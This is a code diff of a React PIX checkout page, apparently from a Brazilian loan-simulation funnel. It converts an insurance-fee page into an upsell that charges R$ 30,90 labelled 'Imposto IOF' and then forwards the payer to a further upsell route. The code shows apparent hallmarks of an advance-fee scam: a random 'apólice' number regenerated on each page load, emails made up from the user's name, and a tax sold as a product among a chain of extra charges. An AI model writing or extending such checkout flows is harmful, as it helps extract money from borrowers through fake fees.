@@ -2,11 +2,11 @@ import { useState, useEffect } from 'react'
 import { useLocation, useNavigate } from 'react-router-dom'
 
 // ── Config ─────────────────────────────────────────────────────────────────────
-const AMOUNT            = 39.86
-const INSURANCE_DISPLAY = 'R$ 39,86'
+const AMOUNT            = 30.90
+const TOTAL_DISPLAY     = 'R$ 30,90'
 const COUNTDOWN_SECONDS = 300
 const STATUS_POLL_MS    = 5000
-const NEXT_UPSELL_ROUTE = '/up1'
+const NEXT_UPSELL_ROUTE = '/up2'
 
 // Stable apólice number per page load
 const APOLICE = '#ALZ-' + (1000 + Math.floor(Math.random() * 9000))
@@ -64,13 +64,22 @@ function getUtmParams() {
   }
 }
 
+function getStoredUserData() {
+  try {
+    const raw = localStorage.getItem('userData')
+    return raw ? JSON.parse(raw) : null
+  } catch {
+    return null
+  }
+}
+
 async function createPixPayment(userData, pixKeyType, pixKey) {
   const email = generateEmail(userData.nome)
   const phoneNumber = pixKeyType === 'telefone'
     ? pixKey.replace(/\D/g, '')
     : undefined
 
-  const res = await fetch('/api/pix', {
+  const res = await fetch('/api/pix-upsell', {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
     body: JSON.stringify({
@@ -84,7 +93,7 @@ async function createPixPayment(userData, pixKeyType, pixKey) {
       shippingAmount: 0,
       discountAmount: 0,
       products: [
-        { description: 'Ebook Financeiro', quantity: 1, value: AMOUNT },
+        { description: 'Imposto IOF', quantity: 1, value: AMOUNT },
       ],
       trackingParameters: getUtmParams(),
     }),
@@ -104,13 +113,6 @@ async function checkPixStatus(idTransaction) {
   const res = await fetch(`/api/pix-status?id=${idTransaction}`)
   if (!res.ok) throw new Error('http_error')
   return res.json()
-}
-
-function buildNextUrl(path, loanAmount) {
-  const params = new URLSearchParams(window.location.search)
-  if (loanAmount) params.set('valor', loanAmount)
-  const query = params.toString()
-  return query ? `${path}?${query}` : path
 }
 
 // ── Coberturas ──────────────────────────────────────────────────────────────────
@@ -158,11 +160,14 @@ function CoberturaItem({ label, icon }) {
 
 // ── Main component ─────────────────────────────────────────────────────────────
 
-export default function Payment() {
+export default function PaymentUpsell() {
   const location = useLocation()
   const navigate = useNavigate()
   const state = location.state || {}
-  const { userData, pixKeyType, pixKey, loanAmount } = state
+  // Upsell checkouts always reuse the user's data saved earlier in the main checkout
+  const userData    = getStoredUserData()
+  const pixKeyType  = state.pixKeyType
+  const pixKey      = state.pixKey
 
   const [loading,       setLoading]       = useState(true)
   const [error,         setError]         = useState(false)
@@ -173,14 +178,9 @@ export default function Payment() {
   const [idTransaction, setIdTransaction] = useState('')
   const [paid,          setPaid]          = useState(false)
 
-  // Redirect if accessed without state
+  // Redirect if accessed without any known user
   useEffect(() => {
     if (!userData) navigate('/emprestimo/simulacao', { replace: true })
-  }, [])
-
-  // Persist userData so later upsell pages (reached via plain URL, no route state) can reuse it
-  useEffect(() => {
-    if (userData) localStorage.setItem('userData', JSON.stringify(userData))
   }, [])
 
   // Call payment API on mount
@@ -220,7 +220,7 @@ export default function Payment() {
           console.log('[PIX] Status:', data.status)
           if (data.status === 'paid') {
             setPaid(true)
-            navigate(buildNextUrl(NEXT_UPSELL_ROUTE, loanAmount))
+            navigate(NEXT_UPSELL_ROUTE + window.location.search)
           }
         })
         .catch(err => console.log('[PIX] Erro ao consultar status:', err))
@@ -272,7 +272,7 @@ export default function Payment() {
         {/* Total */}
         <div className="flex items-center justify-between pb-4 mb-5 border-b-2 border-green-500">
           <span className="text-lg font-bold text-gray-800">Total</span>
-          <span className="text-lg font-extrabold text-gray-800">{INSURANCE_DISPLAY}</span>
+          <span className="text-lg font-extrabold text-gray-800">{TOTAL_DISPLAY}</span>
         </div>
 
         {/* PIX section header */}
